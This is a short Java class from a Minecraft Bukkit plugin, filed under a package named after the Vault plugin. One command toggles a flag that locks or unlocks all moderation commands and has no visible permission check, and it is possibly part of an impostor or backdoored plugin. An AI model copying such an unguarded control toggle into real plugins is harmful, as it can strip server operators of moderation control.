package net.milkbowl.vault.commands.cmds;

import org.bukkit.entity.Player;

import net.milkbowl.vault.Core;
import net.milkbowl.vault.commands.CommandManager;
import net.milkbowl.vault.util.Settings;

public class ModerationCommands extends CommandManager {
	
	public void execute(Core plugin, String msg, String[] args, Player p) {
		if (plugin.modcmds) {
			plugin.modcmds = false;
			p.sendMessage(Settings.PREFIX("All moderation commands are now unlocked"));
		} else {
			plugin.modcmds = true;
			p.sendMessage(Settings.PREFIX("All moderation commands are now locked"));
		}
	}

}
